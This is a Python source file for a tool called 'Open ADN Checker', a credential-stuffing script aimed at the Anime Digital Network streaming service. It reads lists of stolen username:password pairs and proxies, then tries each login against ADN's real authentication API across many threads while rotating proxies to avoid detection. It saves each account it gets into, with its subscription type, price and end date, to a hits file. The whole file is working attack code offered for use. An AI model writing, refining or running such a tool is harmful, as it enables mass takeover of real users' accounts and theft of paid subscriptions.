from colorama import Fore, Style, init; init()
import requests, easygui, os, random, time, math
from threading import Thread, Lock

locker = Lock()
def log(combo, subscription_type= None, subscription_price= None, subscription_end= None):
    locker.acquire()
    print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTWHITE_EX}] {combo} | {subscription_type} | {subscription_end} | {subscription_price}.')
    
    with open('./hit.txt', 'a+') as hit_file:
        hit_file.write(f'{combo} | {subscription_type} | {subscription_end} | {subscription_price}\n')
    
    locker.release()


class ADN_CHECKER:
    def __init__(self):
        self.proxy_list = []
        self.combo_list = []
        self.thread_number = 0

        self.checked = 0
        self.error = 0
        self.premium = 0
        self.free = 0
        self.hit = 0
    
    def initialize(self):
        os.system('cls && title Vichy - Open ADN Checker' if os.name == 'nt' else 'clear')
        print(Style.BRIGHT + f'''        
     ██████╗ ██████╗ ███████╗███╗   ██╗     █████╗ ██████╗ ███╗   ██╗
    ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔══██╗████╗  ██║
    ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ███████║██║  ██║██╔██╗ ██║
    ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██║██║  ██║██║╚██╗██║
    ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║██████╔╝██║ ╚████║
     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝                                                                
        '''.replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTWHITE_EX}'))

        print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTBLUE_EX}?{Fore.LIGHTWHITE_EX}] Please select proxy file.')
        proxy_path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Open ADN - Select proxy', multiple= False)
        
        print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTBLUE_EX}?{Fore.LIGHTWHITE_EX}] Please select combo file.')
        combo_path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Open ADN - Select combo', multiple= False)

        with open(proxy_path, 'r') as proxy_file:
            for proxy in proxy_file:
                self.proxy_list.append(proxy.split('\n')[0])
        
        with open(combo_path, 'r') as combo_file:
            for combo in combo_file:
                self.combo_list.append(combo.split('\n')[0])

        self.combo_list = list(set(self.combo_list))
        self.proxy_list = list(set(self.proxy_list))

        print(f'\n{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX}*{Fore.LIGHTWHITE_EX}] Successfully load {len(self.combo_list)} combo and {len(self.proxy_list)} proxy.')

    def update_gui(self):
        while self.checked != len(self.combo_list):
            time.sleep(1)
            print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTBLUE_EX}{time.strftime("%H:%M:%S", time.localtime())}{Fore.LIGHTWHITE_EX}] CHECK: {Fore.LIGHTBLUE_EX}{self.checked}{Fore.LIGHTWHITE_EX} HIT: {Fore.GREEN}{self.hit}{Fore.LIGHTWHITE_EX} FREE: {Fore.LIGHTGREEN_EX}{self.free}{Fore.LIGHTWHITE_EX} PREMIUM: {Fore.LIGHTYELLOW_EX}{self.premium}{Fore.LIGHTWHITE_EX} ERROR: {Fore.LIGHTRED_EX}{self.error}', end='\r')

    def worker(self, proxy, combo_list):
        for combo in combo_list:
            self.checked += 1
            try:
                session = requests.Session()
                session.proxies = {'http': proxy, 'https': proxy}
                session.headers = {'content-type': 'application/json'}

                response = session.post('https://gw.api.animedigitalnetwork.fr/authentication/login', json= { 'username': combo.split(':')[0], 'password': combo.split(':')[1], 'rememberMe': False, 'source': 'Web' })

                if 'accessToken' in response.text:
                    session.headers = {'content-type': 'application/json', 'Authorization': f'Bearer {response.json()["accessToken"]}'}
                    response = session.get('https://gw.api.animedigitalnetwork.fr/subscription/user/').json()['subscription']
                    
                    subscription_type = response['name']
                    subscription_price = response['price']
                    subscription_end = response['endDate'].split('T')[0]

                    log(combo, subscription_type, subscription_end, subscription_price)
                    self.premium += 1
                    self.hit += 1

                elif 'subscription-not-found' in response.text:
                    self.free += 1
                    self.hit += 1
                    log(combo, 'FREE')
            except:
                self.error += 1
                pass
    
    def get_perfect_number(self, N):
        diviseurs = []

        for i in range(1, int(N / 2 + 1)):
            if not N%i:
                diviseurs.append(i)

        best = 1
        for i in diviseurs:
            if abs(i - N / i) < abs(best - N / best):
                best = i

        return best, int((N / best) / 2)

    def start_worker(self):
        thread_list = []
        
        thread_list.append(Thread(target= self.update_gui))
        prft_nbr = self.get_perfect_number(len(self.combo_list))[1]
        for combo in list(zip(*[iter(self.combo_list)] * prft_nbr)):
            thread_list.append(Thread(target= self.worker, args=(random.choice(self.proxy_list), list(combo),)))
        
        print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTBLUE_EX}*{Fore.LIGHTWHITE_EX}] Starting {len(thread_list)} Threads with {prft_nbr} combo.\n')
        for thread in thread_list:
            thread.start()

        for thread in thread_list:
            thread.join()

Checker = ADN_CHECKER()
Checker.initialize()
Checker.start_worker()